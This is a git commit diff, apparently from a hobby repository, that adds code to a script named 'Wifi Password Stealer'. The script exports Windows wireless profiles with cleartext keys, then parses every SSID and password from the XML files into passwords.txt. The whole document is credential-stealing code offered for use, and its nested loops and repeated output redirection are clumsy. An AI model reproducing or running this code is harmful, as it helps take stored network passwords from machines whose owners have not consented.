04921179edd95da72c69580618c16c5bfe41ec8f
69PercentFat <shubham11501@gmail.com>
2023-06-23 22:01:07 +0530

    hackies

--- Wifi Password Stealer/stealer.py
+++ Wifi Password Stealer/stealer.py
@@ -23,3 +23,27 @@ wifi_password = []
 command = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output = True).stdout.decode()
 
 path = os.getcwd()
+
+#hackies
+
+for filename in os.listdir(path):
+    if filename.startswith("Wi-Fi") and filename.endswith("xml"):
+        wifi_files.append(filename)
+
+        for i in wifi_files:
+                with open(i, 'r') as f:
+                        for line in f.readlines():
+                                if 'name' in line:
+                                        stripped = line.strip()
+                                        front = stripped[6:]
+                                        back = front[:-7]
+                                        wifi_name.append(back)
+                                if 'KeyMaterial' in line:
+                                        stripped = line.strip()
+                                        front = stripped[13:]
+                                        back = front[:-14]
+                                        wifi_password.append(back)  
+                                        for x, y in zip(wifi_name, wifi_password): 
+                                                sys.stdout = open("passwords.txt", )    
+                                                print("SSID: "+x, "Password: "+y, sep='\n')
+                                                sys.stdout.close()
